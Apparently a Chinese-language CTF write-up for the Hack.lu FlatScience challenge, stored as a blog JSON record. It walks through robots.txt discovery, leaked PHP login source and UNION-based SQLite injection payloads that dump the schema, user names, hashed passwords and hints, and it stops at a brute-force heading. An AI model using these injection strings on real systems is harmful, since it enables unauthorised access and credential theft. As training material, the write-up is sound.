{"title":"HackLu FlatScience WP","slug":"HackLu-Flatscience-WP","date":"2017-03-23T07:13:47.000Z","updated":"2019-08-01T11:50:01.964Z","comments":true,"path":"api/articles/HackLu-Flatscience-WP.json","photos":[],"link":"","excerpt":"its so hard for me to write script!","covers":["https://i.imgur.com/E9wLCCI.png","https://i.imgur.com/kJafN4R.png","https://i.imgur.com/lSrD5AX.png","https://i.imgur.com/NnolACR.png","https://i.imgur.com/ynG34iE.png"],"content":"<p>its so hard for me to write script!</p>\n<a id=\"more\"></a>\n<h1 id=\"HackLu-FlatScience-WP\"><a href=\"#HackLu-FlatScience-WP\" class=\"headerlink\" title=\"HackLu FlatScience WP\"></a>HackLu FlatScience WP</h1><hr>\n<h2 id=\"0x01-用到的东西\"><a href=\"#0x01-用到的东西\" class=\"headerlink\" title=\"0x01 用到的东西\"></a>0x01 用到的东西</h2><ol>\n<li>robots.txt</li>\n<li>对sqlite数据库了解</li>\n<li>代码审计</li>\n<li>sql注入</li>\n<li>python写爆破脚本</li>\n</ol>\n<h2 id=\"0x02-robots-txt\"><a href=\"#0x02-robots-txt\" class=\"headerlink\" title=\"0x02 robots.txt\"></a>0x02 robots.txt</h2><p>刚拿到题确实一筹莫展，没什么经验。查看robots文件之后尝试登录./login.php</p>\n<p><img src=\"https://i.imgur.com/E9wLCCI.png\" alt=\"robots.txt\"></p>\n<p><img src=\"https://i.imgur.com/kJafN4R.png\" alt=\"login.php\"></p>\n<h2 id=\"0x03-SQLite-数据库结构\"><a href=\"#0x03-SQLite-数据库结构\" class=\"headerlink\" title=\"0x03 SQLite 数据库结构\"></a>0x03 SQLite 数据库结构</h2><ol>\n<li><p>SQLite3数据库Sql_master表结构</p>\n<ol>\n<li><p>储存在根页中，是系统表，与mysql中的information_schema表类似，储存了该数据库中各个表的信息的建表SQL语句。</p>\n</li>\n<li><p>如图<img src=\"https://i.imgur.com/lSrD5AX.png\" alt=\"SQLite3结构\"></p>\n</li>\n<li><p>基础的查询语句有<br><code>select * from sqlite_master WHERE type=&quot;table&quot;;</code> 可以查询到当前数据库中所有表的详细信息。</p>\n<h2 id=\"0x04-代码审计\"><a href=\"#0x04-代码审计\" class=\"headerlink\" title=\"0x04 代码审计\"></a>0x04 代码审计</h2><p>传入debug之后得到源码</p>\n<p><a href=\"http://111.198.29.45:30157/login.php?debug\" target=\"_blank\" rel=\"noopener\">http://111.198.29.45:30157/login.php?debug</a></p>\n<?php\nif(isset($_POST['usr']) && isset($_POST['pw'])){\n $user = $_POST['usr'];\n $pass = $_POST['pw'];\n\n $db = new SQLite3('../fancy.db');\n\n $res = $db->query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\");\nif($res){\n $row = $res->fetchArray();\n}\nelse{\n echo \"<br>Some Error occourred!\";\n}\n\nif(isset($row['id'])){\n     setcookie('name',' '.$row['name'], time() + 60, '/');\n     header(\"Location: /\");\n     die();\n}\n\n}\n\nif(isset($_GET['debug']))\nhighlight_file('login.php');\n?><p> </p>\n</li>\n</ol>\n</li>\n</ol>\n<p>可以看出使用了SQLite3数据库，对post的参数没有过滤直接进行了查询。如果查询到了id就执行setcookie操作，将name字段内容加进cookie里，时间+60s。所以我们可以尝试POST参数注入。</p>\n<p>  <code>usr=admin&#39; union select name,sql from sqlite_master limit 1,1--+&amp;pw=admin</code></p>\n<p>这时执行的查询语句就变成了这样</p>\n<p><code>SELECT id,name from Users where name=&#39;admin&#39; union select name,sql from sqlite_master limit 1,1-- and password=&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;</code><br>查看返回的cookie，name的value是查到的sql建表语句，id是查到的name.</p>\n<p><img src=\"https://i.imgur.com/NnolACR.png\" alt=\"cookie的值\"><br>可以看出数据库的结构是</p>\n<pre><code> CREATE TABLE Users(\nid int primary key,\nname varchar(255),\npassword varchar(255),\nhint varchar(255)\n)</code></pre><p>这样就知道了表名和字段名，接下来就可以得到内容</p>\n<pre><code>    &apos; union select id,name from Users limit 0,1\n&apos; union select id,password from Users limit 0, 1\n&apos; union select id,hint from Users limit 0,1</code></pre><p>具体内容如下<br><img src=\"https://i.imgur.com/ynG34iE.png\" alt></p>\n<p>尝试CMD5破解admin的密码，没查出来，根据hint用网站的pdf里面的词爆破。（也可以看到密码进行了SHA1+salt的加密）</p>\n<h2 id=\"0x05-python爆破\"><a href=\"#0x05-python爆破\" class=\"headerlink\" title=\"0x05 python爆破\"></a>0x05 python爆破</h2>","categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"WP","slug":"WP","count":5,"path":"api/tags/WP.json"}]}